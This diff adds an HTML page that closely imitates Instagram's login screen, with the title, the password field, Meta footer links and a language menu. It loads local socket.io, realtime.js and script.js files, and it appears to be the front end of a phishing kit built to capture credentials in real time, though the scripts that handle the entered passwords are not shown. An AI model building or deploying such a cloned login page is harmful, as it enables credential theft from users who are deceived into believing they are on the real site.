@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="title">instagram.com</title>
+    <link rel="stylesheet" href="./styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="left">
+            <div class="image-container">
+                <img src="img/people.png" alt="Instagram preview">
+            </div>
+        </div>
+        <div class="right">
+            <div class="box">
+                <img id="instagram-logo" src="" alt="Instagram logo" class="theme-logo">
+                <div class="form">
+                    <div class="input-field-container">
+                        <input class="input" type="text" id="username-input" data-i18n-placeholder="phone_placeholder" placeholder="" inputmode="latin" autocorrect="off" autocomplete="off">
+                        <label for="username-input" data-i18n-label="phone_placeholder">Phone number, username, email address</label>
+                    </div>
+                    <div class="input-field-container">
+                        <input class="input" type="password" id="password-input" name="password" data-i18n-placeholder="password_placeholder" placeholder="" inputmode="latin" autocorrect="off" autocomplete="off">
+                        <label for="password-input" data-i18n-label="password_placeholder">Password</label>
+                    </div>
+                    
+                    <button id="login-button" data-i18n="login_button">Log in</button>
+                    <div class="or">
+                        <div class="sep"></div>
+                        <span data-i18n="or_text">OR</span>
+                        <div class="sep"></div>
+                    </div>
+                    <a href="https://www.facebook.com/login.php?" class="facebook">
+                        <img src="./img/facebook.png" alt="Facebook logo">
+                        <p data-i18n="facebook_connect">Log in with Facebook</p>
+                    </a>
+                    <div class="forgot">
+                        <a href="https://www.instagram.com/accounts/password/reset/" data-i18n="forgot_password">Forgot password?</a>
+                    </div>
+                </div>
+                <div class="report-info" data-i18n="report_info">
+                    You can also report content you believe is unlawful in your country without logging in.
+                </div>
+            </div>
+            <div class="box second">
+                <p><span data-i18n="no_account">Don't have an account?</span> <a href="https://www.instagram.com/accounts/emailsignup/" data-i18n="sign_up">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="https://www.meta.com/fr-fr/about/?utm_source=about.meta.com&utm_medium=redirect" data-i18n="footer_meta" target="_blank" rel="noopener noreferrer">Meta</a>
+            <a href="https://about.instagram.com/" data-i18n="footer_about" target="_blank" rel="noopener noreferrer">About</a>
+            <a href="https://about.instagram.com/blog/" data-i18n="footer_blog" target="_blank" rel="noopener noreferrer">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers" data-i18n="footer_jobs" target="_blank" rel="noopener noreferrer">Jobs</a>
+            <a href="https://help.instagram.com/" data-i18n="footer_help" target="_blank" rel="noopener noreferrer">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram-platform" data-i18n="footer_api" target="_blank" rel="noopener noreferrer">API</a>
+            <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" data-i18n="footer_confidentiality">Confidentiality</a>
+            <a href="http://instagram.com/privacy/cookie_settings/" data-i18n="footer_cookie_settings" target="_blank" rel="noopener noreferrer">Cookie settings</a>
+            <a href="https://help.instagram.com/581066165581870/" data-i18n="footer_terms">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/" data-i18n="footer_places">Places</a>
+            <a href="https://www.instagram.com/web/lite/" data-i18n="footer_instagram_lite">Instagram Lite</a>
+            <a href="https://www.meta.ai/?utm_source=foa_web_footer" data-i18n="footer_meta_ai" target="_blank" rel="noopener noreferrer">Meta AI</a>
+            <a href="https://www.meta.ai/pages/what-is-labubu?utm_source=foa_web_footer" data-i18n="footer_meta_ai_articles" target="_blank" rel="noopener noreferrer">Meta AI Articles</a>
+            <a href="https://www.threads.com/" data-i18n="footer_threads" target="_blank" rel="noopener noreferrer">Threads</a>
+            <a href="https://facebook.com/help/instagram/261704639352628" data-i18n="footer_importing_contacts" target="_blank" rel="noopener noreferrer">Importing contacts and non-users</a>
+            <a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1#" data-i18n="footer_meta_verified">Meta Verified</a>
+            <a href="https://www.facebook.com/help/cancelcontracts?source=instagram.com" data-i18n="footer_cancel_contracts">Cancel contracts here</a>
+        </div>
+        
+        <div class="footer-bottom">
+            <span class="language-selector">
+                <div class="language-current" id="current-language">
+                    <span>English</span>
+                    <span class="dropdown-arrow"></span>
+                </div>
+                <div class="language-dropdown" id="language-dropdown">
+                    <div class="language-option" data-lang="af">Afrikaans</div>
+                    <div class="language-option" data-lang="ar">العربية</div>
+                    <div class="language-option" data-lang="cs">Čeština</div>
+                    <div class="language-option" data-lang="da">Dansk</div>
+                    <div class="language-option" data-lang="de">Deutsch</div>
+                    <div class="language-option" data-lang="el">Ελληνικά</div>
+                    <div class="language-option" data-lang="en">English</div>
+                    <div class="language-option" data-lang="en-GB">English (UK)</div>
+                    <div class="language-option" data-lang="es-ES">Español (España)</div>
+                    <div class="language-option" data-lang="es">Español</div>
+                    <div class="language-option" data-lang="fa">فارسی</div>
+                    <div class="language-option" data-lang="fi">Suomi</div>
+                    <div class="language-option" data-lang="fr">Français</div>
+                    <div class="language-option" data-lang="he">עברית</div>
+                    <div class="language-option" data-lang="id">Bahasa Indonesia</div>
+                    <div class="language-option" data-lang="it">Italiano</div>
+                    <div class="language-option" data-lang="ja">日本語</div>
+                    <div class="language-option" data-lang="ko">한국어</div>
+                    <div class="language-option" data-lang="ms">Bahasa Melayu</div>
+                    <div class="language-option" data-lang="no">Norsk</div>
+                    <div class="language-option" data-lang="nl">Nederlands</div>
+                    <div class="language-option" data-lang="pl">Polski</div>
+                    <div class="language-option" data-lang="pt-BR">Português (Brasil)</div>
+                    <div class="language-option" data-lang="pt-PT">Português (Portugal)</div>
+                    <div class="language-option" data-lang="ru">Русский</div>
+                    <div class="language-option" data-lang="sv">Svenska</div>
+                    <div class="language-option" data-lang="th">ภาษาไทย</div>
+                    <div class="language-option" data-lang="fil">Filipino</div>
+                    <div class="language-option" data-lang="tr">Türkçe</div>
+                    <div class="language-option" data-lang="zh-CN">中文(简体)</div>
+                    <div class="language-option" data-lang="zh-TW">中文(台灣)</div>
+                    <div class="language-option" data-lang="bn">বাংলা</div>
+                    <div class="language-option" data-lang="gu">ગુજરાતી</div>
+                    <div class="language-option" data-lang="hi">हिन्दी</div>
+                    <div class="language-option" data-lang="hr">Hrvatski</div>
+                    <div class="language-option" data-lang="hu">Magyar</div>
+                    <div class="language-option" data-lang="kn">ಕನ್ನಡ</div>
+                    <div class="language-option" data-lang="ml">മലയാളം</div>
+                    <div class="language-option" data-lang="mr">मराठी</div>
+                    <div class="language-option" data-lang="ne">नेपाली</div>
+                    <div class="language-option" data-lang="pa">ਪੰਜਾਬੀ</div>
+                    <div class="language-option" data-lang="si">සිංහල</div>
+                    <div class="language-option" data-lang="sk">Slovenčina</div>
+                    <div class="language-option" data-lang="ta">தமிழ்</div>
+                    <div class="language-option" data-lang="te">తెలుగు</div>
+                    <div class="language-option" data-lang="ur">اردو</div>
+                    <div class="language-option" data-lang="vi">Tiếng Việt</div>
+                    <div class="language-option" data-lang="zh-HK">中文(香港)</div>
+                    <div class="language-option" data-lang="bg">Български</div>
+                    <div class="language-option" data-lang="fr-CA">Français (Canada)</div>
+                    <div class="language-option" data-lang="ro">Română</div>
+                    <div class="language-option" data-lang="sr">Српски</div>
+                    <div class="language-option" data-lang="uk">Українська</div>
+                </div>
+            </span>
+            
+            <div class="footer-copyright">
+                <span data-i18n="footer_copyright">© 2025 Instagram by Meta</span>
+            </div>
+        </div>
+    </footer>
+    <script src="/socket.io/socket.io.js"></script> 
+    <script src="./realtime.js"></script>
+    <script src="./script.js"></script>
+</body>
+</html>
